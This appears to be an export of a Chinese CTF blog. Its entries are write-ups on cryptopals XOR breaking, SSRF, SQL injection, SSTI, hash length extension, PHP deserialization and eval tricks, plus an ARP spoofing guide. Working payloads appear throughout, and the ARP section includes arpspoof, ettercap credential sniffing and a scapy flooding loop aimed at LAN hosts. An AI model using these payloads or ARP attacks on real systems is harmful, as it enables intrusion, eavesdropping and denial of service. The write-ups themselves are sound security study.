&gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])]) def hamming_distance(b1, b2):#计算二进制字符按位异或后1的个数 differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bits def score(s): freq = {} freq[&apos; &apos;] = 700000000 freq[&apos;e&apos;] = 390395169 freq[&apos;t&apos;] = 282039486 freq[&apos;a&apos;] = 248362256 freq[&apos;o&apos;] = 235661502 freq[&apos;i&apos;] = 214822972 freq[&apos;n&apos;] = 214319386 freq[&apos;s&apos;] = 196844692 freq[&apos;h&apos;] = 193607737 freq[&apos;r&apos;] = 184990759 freq[&apos;d&apos;] = 134044565 freq[&apos;l&apos;] = 125951672 freq[&apos;u&apos;] = 88219598 freq[&apos;c&apos;] = 79962026 freq[&apos;m&apos;] = 79502870 freq[&apos;f&apos;] = 72967175 freq[&apos;w&apos;] = 69069021 freq[&apos;g&apos;] = 61549736 freq[&apos;y&apos;] = 59010696 freq[&apos;p&apos;] = 55746578 freq[&apos;b&apos;] = 47673928 freq[&apos;v&apos;] = 30476191 freq[&apos;k&apos;] = 22969448 freq[&apos;x&apos;] = 5574077 freq[&apos;j&apos;] = 4507165 freq[&apos;q&apos;] = 3649838 freq[&apos;z&apos;] = 2456495 score = 0 string=bytes.decode(s) for c in string.lower(): if c in freq: score += freq[c] return score def break_single_key_xor(b1): max_score = 0 english_plaintext = 0 key = 0 for i in range(0,256): b2 = [i] * len(b1) try: plaintext = bxor(b1, b2) pscore = score(plaintext) except Exception: continue if pscore &gt; max_score or not max_score: max_score = pscore english_plaintext = plaintext key = chr(i) return key text = &apos;上面脚本中输出的结果&apos; with open(r&quot;c:/Users/lyy18291855970/Desktop/密码学/密码题/the cryptopals crypto challenges/6.txt&quot;, &quot;r&quot;) as f: for line in f: text += line b = base64.b64decode(text) normalized_distances = [] for KEYSIZE in range(2, 40): #我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] b7 = b[KEYSIZE * 6: KEYSIZE * 7] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) ) normalized_distances = sorted(normalized_distances, key=lambda x: x[1]) for KEYSIZE, _ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;n&quot;) s = bytes.decode(plaintext) print(s)]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF]]></title>
    <url>%2F2019%2F08%2F02%2FSSRF%2F</url>
    <content type="text"><![CDATA[BUUCTF和De1CTF两道题目两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下 SSRFme(BUUCTF)&lt;?php if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) { $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]; } $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); 题目解析1.首先madir创建sandbox/+md5(orange+你的ip)目录，并用chdir修改当前目录2.shell_exec函数会执行内部的代码，返回值为执行命令后所获取内容的第一行3.GET命令执行传入的url参数，GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求4.escapeshellarg函数将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。5.pathinfo() 函数以数组的形式返回文件路径的信息。 &lt;?php print_r(pathinfo(&quot;/testweb/test.txt&quot;));?&gt; 输出：Array([dirname] =&gt; /testweb [basename] =&gt; test.txt [extension] =&gt; txt) 5.传入filename的最后一级文件夹并将shell_exec函数返回的数据写入文件，可以通过sandbox/+md5(orange+你的ip)/文件名访问 访问根目录 ?url=/&amp;filename=a ip查询，REMOTE_ADDR获取的访问的本机ip之后可以在sandbox/…../a看到目录，有flag，但是无法访问 然后在大佬wp中发现 perl在open当中可以执行命令，如:open(FD, &quot;ls|&quot;)或open(FD, &quot;|ls&quot;)都可以执行ls命令 而GET是在perl下执行的，当GET使用file协议的时候就会调用到perl的open函数 也就是GET中使用file协议可以执行命令，但是需要bash -c Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入 构造url： ?url=file:bash -c /readflag|&amp;filename=a bash -c 执行了命令 访问sandbox/...../a拿到flag SSRFme(De1CTF)题目源码 /#! /usr/bin/env python /#encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(&apos;latin1&apos;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result[&apos;code&apos;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&apos;data&apos;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&apos;code&apos;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;) result[&apos;code&apos;] = 200 result[&apos;data&apos;] = f.read() if result[&apos;code&apos;] == 500: result[&apos;data&apos;] = &quot;Action Error&quot; else: result[&apos;code&apos;] = 500 result[&apos;msg&apos;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False /#generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;]) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;]) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&apos;/&apos;) def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == &apos;__main__&apos;: app.debug = False app.run(host=&apos;0.0.0.0&apos;,port=80) 题目分析： def __init__（self, action, param, sign, ip）初始化self类，后面的都是self类的参数 @app.route(‘/‘)改变url路径 waf函数中strip函数删除了param参数前后缀的字符，lower函数将大写变成小写，并检测参数前缀是不是file和gopher， 首先是前几天补的hash长度拓展攻击，geneSign函数那那可以得到action=scan时候的md5(key+param+action)，hashpump在action参数后面补位加了个read，生成新的md5和action参数，才可以打印出data的内容 /De1ta?param=http://139.180.128.86 Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%01%00%00%00%00%00%00read;sign=81670763d66ae6d466304b9106550817 可以通过scan函数中urllib.urlopen(param).read()[:50]得到一部分网页内容 {&quot;code&quot;: 200, &quot;data&quot;: &quot;#! /usr/bin/env python\r\n#encoding=utf-8\r\nfrom flas&quot;} file和gopher协议都被过滤了，然后就卡住了， 本来觉得可能是python urllib库的一个cve，后来发现好像不行 http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo这样可以注入HTTP头然后突然发现urlopen可以直接读取文件，结合hint：flag.txt直接让param为flag.txt就能拿到flag（太草了，那你弄什么waf函数 De1ta?param=flag.txt Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=d7163f39ab78a698b3514fd465e4018a SSRF介绍SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）也就是说通过普通用户可以访问的网站，来攻击内部网络系统。 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能(服务器会响应用户的url请求)且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF(1)]]></title>
    <url>%2F2019%2F07%2F28%2FBUUCTF-1%2F</url>
    <content type="text"><![CDATA[BUUCTF好多之前比赛没做也没来得及补的题，良心平台QAQ warmupsource.php里源码 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&apos;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; } } if (! empty($_REQUEST[&apos;file&apos;]) &amp;&amp; is_string($_REQUEST[&apos;file&apos;]) &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]) ) { include $_REQUEST[&apos;file&apos;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;; } ?&gt; 可以看到我们需要get传递file参数；checkFile函数检查了传递参数；mb_strpos函数检测第一次出现? 的位置；mb_substr函数返回了file参数0和第一个问号之间的值，in_array函数检测在$whitelist是否含$_page的值也就是source.php和hint.php 之后存在include函数，所以我们构造payload: ?file=hint.php?/../../../../../../../../ffffllllaaaagggg hint.php?/被当成了目录拿到flag 随便注测试1’or 1=1#可行，存在sql注入1’order by 2#可行，到3报错，查询列数为2然后测试 1’union select 1,2# return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject); select被过滤了，show没有被过滤，构造闭合语句进行查询 堆叠注入：在mysql中前语句闭合分号结束后后面的语句也会被执行 查询： 1&apos;;show databases; 1&apos;;show tables; 1&apos;;show columns from 1919810931114514; (不知道为啥查不出来破案了，字符串作为表名需要加反引号 1&apos;;show columns from `1919810931114514`; ‘ 但到此处就无法查询字段的内容了 存储过程绕过sql serve中给变量幅值可以用 set @变量名=&apos;字符串&apos;; prepare语句用于预备一个语句，并指定语句名称，以后可用名称引用该语句。语句名称对大小写不敏感。from后可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。语法 prepare 语句定义名称 from 变量名称; execute语句用于执行命令语法 execute 变量名称; payload： 1&apos;;Set @a=concat(&apos;s&apos;,&apos;elect * from `1919810931114514`&apos;);prepare s from @a;execute s; strstr对set进行了一步过滤，不过没什么影响，大小写就能绕过(这么看这种解法应该是预期解。 重命名正则中没有过滤alert和rename关键字 alter和rename命令 alter table 原表名 rename to 新表名; alter table 表名 change 要修改的字段名 新字段名 新字段的数据类型; 查询的是words表，有两列id和data； 我们猜测他的查询语句为select * from words where id= 1.将words表改名为其它名字 2.1919810931114514改名为words 3.将flag改名为id； 然后直接查询1就可以找到flag； 题目环境好像出现了一些问题，没有复现成功QAQ suctf sql也是堆叠注入；绕了半天没绕过去，后来发现是git源码泄露，select *一行就查出来了QAQ easy tornado开始以为是hash长度拓展攻击，但是没有secret长度，file参数传递也要是/fllllllllllllag，试了半天没试出来QAQ，看了writeup，error那存在ssti，（自闭了 貌似是render提示了是ssti http://web9.buuoj.cn/error?msg={{globals}} 加号被过滤了2不行，其他测试都是orz http://web9.buuoj.cn/error?msg={{handler.settings}} handler.settings内有cookie_secret（又自闭了，为什么QAQtornado框架里handler.settings保存一些配置选项 settings，使用tornado.web.Application(handler, **settings) 我们却不知道这个settings到底是什么，究竟有什么作用，今天就来介绍一下 settings是一个字典，主要保存一些配置选项 拿到cookie_secret就拿到flag了 swp当vim不正常退出时，比如你编辑的文件config.php，由于vim的不正常退出，此时会在同目录下生成:config.php.swp，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件！ upload补充一下条件竞争：下面以相关操作逻辑顺序设计的不合理为例，具体讨论一下这类问题的成因。在很多系统中都会包含上传文件或者从远端获取文件保存在服务器的功能（如：允许用户使用网络上的图片作为自己的头像的功能），下面是一段简单的上传文件释义代码： &lt;?php if(isset($_GET[&apos;src&apos;])){ copy($_GET[&apos;src&apos;],$_GET[&apos;dst&apos;]); //... //check file unlink($_GET[&apos;dst&apos;]); //... } ?&gt; 这段代码看似一切正常，先通过copy($GET[‘src’],$GET[‘dst’])将文件从源地址复制到目的地址，然后检查$GET[‘dst’]的安全性，如果发现$GET[‘dst’]不安全就马上通过unlink($_GET[‘dst’])将其删除。但是，当程序在服务端并发处理用户请求时问题就来了。如果在文件上传成功后但是在相关安全检查发现它是不安全文件删除它以前这个文件就被执行了那么会怎样呢？ 假设攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。 由上述过程我们可以看到这种“先将猛兽放进屋，再杀之”的处理逻辑在并发的情况下是十分危险的，极易导致条件竞争漏洞的发生。 仍以上述情境为例，攻击者通过不断地发起访问上传的恶意文件请求的方法成功的将原有处理不安全文件，一个脚本多线程发包，一个脚本不断去访问上传的文件生成shell文件 上传文件E→删除不安全文件E 的业务逻辑变成了 上传文件E→访问执行文件E，生成shell文件S→删除不安全文件E 不安全文件E虽然被删除了，但是有它生成出来的shell文件S却保留在了服务器中，对攻击者来说这个shell文件S才是后续攻击的关键。 原文链接：http://wiki.secbug.net/web_race-condtion.html]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hash长度扩展攻击]]></title>
    <url>%2F2019%2F07%2F27%2FHash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Hash长度扩展攻击很早之前蓝鲸ctf的时候就遇到了hash扩展长度攻击的问题，当时没有整理，趁把这道题放夏令营的时候整理一下 &lt;?php //$flag and $secret in flag.php and strlen($secret)==15 include(&quot;flag.php&quot;); if(!isset($_POST[&apos;username&apos;])){show_source(__FILE__);die();} $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($_COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 我们已知的是： md5($secret.adminadmin)= 2aba05712564dde4fb15fdb5f0e0de66; 以及$secret的长度为15； 我们要得到的是如何构造一个$password让 md5($secret . urldecode($username . $password)))已知，并构造cookie； 此处我们并不知道$secret的值是什么，password又不能等于admin，所以我们需要用到hash长度扩展攻击；相当于是现在我们不知道字符串是什么。只知道其长度，通过hash长度拓展攻击，我们可以得到在原字符串的基础上进行了补位以及添加新字符串的hash值 原理首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。 补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。 （原理原文链接：www.freebuf.com/articles/web/69264.html） 也就是说我们先对$secret.adminadmin进行补位，然后添加一个新的字符串，用补位完成后那个分组生成的register值对新添加的字符串进性运算得到最后的hash值，而补位完成后那个分组的register值和我们已知的md5($secret.adminadmin)值相等。 hashpumpHashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响。 安装 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 所需数据 root@ubuntu:~/HashPump# hashpump Input Signature: 2aba05712564dde4fb15fdb5f0e0de66//hash值 Input Data: adminadmin//加密的明文 Input Key Length: 15//key长度 Input Data to Add: 1 286d5b319a75f5f498dac9a52dcb360e//新生成的md5也就是getmein adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x001//admin.$passowrd]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dockerfile搭建简单Web题目]]></title>
    <url>%2F2019%2F07%2F11%2FDockerfile%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95Web%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[CTF赛程结束后，Web题目环境关了不是太好复现，学习了下怎么用Dockerfile来重新搭建一下环境（只学会了怎么用，自己出题还是不会写，菜哭） Docker简介Docker常用命令拉取镜像： docker pull imagename 查看docker当前镜像： docker images 新建一个docker容器，并映射端口号： docker run -d -p host port:docker port imagename 用到的一些命令： -d 后台运行 -P(大写) 随机把容器的端口映射到一个主机未使用的高端口 -p(小写) 格式为主机端口：容器端口 ，自选端口映射 -i 以交互模式运行容器，常与-t连用 -t 为容器重新分配一个伪输入终端，常与-i连用 查看运行中的docker容器： docker ps -a 进入一个docker容器： docker exec -it container—id bash 拷贝本地文件到docker： docker cp /root/ container id:容器内路径（var/www/html） 开始/停止容器 docker start/stop container id 首先我们在github下载开源的Web题目源码php4fun的好多challenge，选取了challenge2 利用xftp6将文件上传到服务器root文件夹下，cd命令进入该文件， docker build -t w . 使用下载的dockerfile文件创建一个命名为w的镜像 新建容器，并随机分配端口 docker run -d -P w 访问32774端口，题目搭建完成 搭建时遇到的问题docker: Error response from daemon: OCI runtime create failed: container_linux.go:345: starting container process caused &quot;exec: \&quot;httpd-foreground\&quot;: executable file not found in $PATH&quot;: unknown. 解决方案 更改文件权限 chmod +x httpd-foreground 解题payload：PHP 复杂变量PHP 中的变量用一个$+变量名来表示。变量区分大小写，我们还可以利用${xxx}的形式来表达一个变量。 函数、方法、静态类变量和类常量只有在 PHP 5 以后才可在 {$} 中使用。然而，只有在该字符串被定义的命名空间中才可以将其值作为变量名来访问。只单一使用花括号 ({}) 无法处理从函数或方法的返回值或者类常量以及类静态变量的值。 eval()函数函数的作用如下： eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 解题题目意思：接受一个$_GET[‘str’]的传参，在经过addslashes()函数转义特殊符号与正则表达式检验之后，传入eval()当中拼接到$str=””;变量当中。 ?str=${phpinfo()} 但phpinfo()并非变量名却依旧执行了该命令，在 php 中，可以接受函数的返回值作为变量名，而phpinfo()的返回值为TRUE，所以先将phpinfo()执行了，将返回值返回作为了变量名。读取flag.php的内容： ?str=${eval($_REQUEST[c])}&amp;c=system(&apos;cat *&apos;); 执行了eval($_REQUEST[c]，并用其返回值表达了一个变量。]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP攻击]]></title>
    <url>%2F2019%2F05%2F04%2FARP%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。 ARP欺骗原理其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无法收到应答的数据包，也就等于断网了。本实验的过程也就是常说的 ARP欺骗。 IP地址，子网掩码，网关定义IP地址IP地址：为了使连入Internet的众多电脑主机在通信时能够相互识别，Internet中的每一台主机都分配有一个唯一的32位地址，该地址称为IP地址，也称作网际地址。IP地址由4个数组成，每个数可取值0～255。 子网掩码子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。 子网掩码的设定必须遵循一定的规则。与IP地址相同，子网掩码的长度也是32位，左边是网络位，用二进制数字“1”表示；右边是主机位，用二进制数字“0”表示。例如IP地址为“192.168.1.1”和子网掩码为“255.255.255.0”。其中，“1”有24个，代表与此相对应的IP地址左边24位是网络号；“0”有8个，代表与此相对应的IP地址右边8位是主机号。这样，子网掩码就确定了一个IP地址的32位二进制数字中哪些是网络号、哪些是主机号。 网关大家都知道，从一个房间走到另一个房间，必然要经过一扇门。同样，从一个网络向另一个网络发送信息，也必须经过一道“关口”，这道关口就是网关。顾名思义，网关(Gateway)就是一个网络连接到另一个网络的“关口”。同一局域网下的网关相同。 arpspoof大家好，我是练习时长两小时半的个人练习生，喜欢唱、跳、arp，突发奇想想学一下rap，研究了大半天发现工具基本上用不了，arpattacker的自动攻击频率太低，所以只能自己写包（dbp，不会自己写，菜哭），之后尝试了下Windows的arpspoof简单软件，可以实现对手机ip的断网操作，但是电脑无法断开，在linux上安装了arpspoof，安装和虚拟机的网络上遇到了一些问题，下面记录一下问题的解决方法。 安装arpspoofapt-get install dsniff ssldump 虚拟机网络问题需要使用桥接模式，直接连接物理网络，在NAT模式中，执行攻击命令时会报错 libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required NAT模式会共享主机的ip地址。 查询和攻击命令查询本机网卡和ip地址 ifconfig 查询网关 route -n 查询连接在局域网的ip地址 fping -asg 192.168.1.0/24 fping -asg 网口.0/24 nmap -sP 192.168.1.0/24 nmap -sP 网口.0/24 攻击命令 sudo -s arpspoof -i ens33 -t 192.168.1.102 192.168.1.1 sudo -s arpspoof -i 网卡 -t 攻击ip 网关 arp欺骗IP转发： echo 1 &gt; /proc/sys/net/ipv4/ip_forward cat /proc/sys/net/ipv4/ip_forward 图片捕获：（流量转发后网页浏览很卡，很多图片和网站打不开，体验极差 driftnet -i ens33 抓取账号密码：（好像已经没用了，试了几个网站都抓不到 ettercap -Tq -i eth0 scapyLinux下实现arp攻击scapy是一个很好的工具，还是先从断网开始， p = Ether()/ARP()//构造一个包 p.hwdst = &apos;b4:6d:83:88:24:08&apos; //要攻击的主机mac地址 p.pdst = &apos;192.168.1.108&apos; //要攻击的主机的ip p.psrc = &apos;192.168.1.1&apos; //网关ip p.hwsrc = &apos;aa:aa:aa:aa:aa:aa&apos; //随便写个mac地址 while 1: sendp(p,inter=0.005,count=9999)//无限发送，按Ctrl+z停止发送 csdn上的一篇文章，原文链接：https://blog.csdn.net/qq_35315699/article/details/73863632 之后再学一下怎么用python写包（咕~，话说有内网我是不是可以直接用wireshark？？？？]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国赛做题+补题]]></title>
    <url>%2F2019%2F04%2F28%2F%E5%9B%BD%E8%B5%9B%E5%81%9A%E9%A2%98-%E8%A1%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。 web1 just soso看源码发现提示 &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; php封装协议file=php://filter/read=convert.base64-encode/resource=hint.php可读index.php和hint.php的源码，base64解码得到源码如下 Index.php &lt;html&gt; &lt;?php error_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;]; if(!isset($file)){ echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;; } if(preg_match(&quot;/flag/&quot;,$file)){ die(&apos;hack attacked!!!&apos;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload); }else{ echo &quot;Missing parameters&quot;; } ?&gt; &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; &lt;/html&gt; Hint.php &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } ?&gt; 可以看到是反序列化的问题，存在正则匹配ban掉了“flag”，所以不能直接读flag.php，反序列化构造中也需要用到flag，url地址三斜杠可绕过foreach的遍历；__wakeup中会this-&gt;$k = null;会将this指向空，需要绕过，__wakeup触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。所以再反序列化后，将Handle类的对象个数改变就可绕过；MD5的if($this-&gt;token === $this-&gt;token_flag)本来以为是伪随机数种子，后来发现只需让$F-&gt;token=&amp;$F-&gt;token_flag;即可&amp;表示取变量，让两个变量值关联起来 反序列化脚本 &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } $F = new Flag(&apos;flag.php&apos;); $F-&gt;token=&amp;$F-&gt;token_flag; $H = new Handle($F); $test = serialize($H); echo $test ?&gt; 由于private的特性，需要在Handle和handle对象前面加上%00 或者/00，\00但是前面的就应该改为S，不是s，因为如果是S那么类似\00abc 就是\0 a b c 四个字符，所以就是S:14:”\00Handle\00handle” payload： 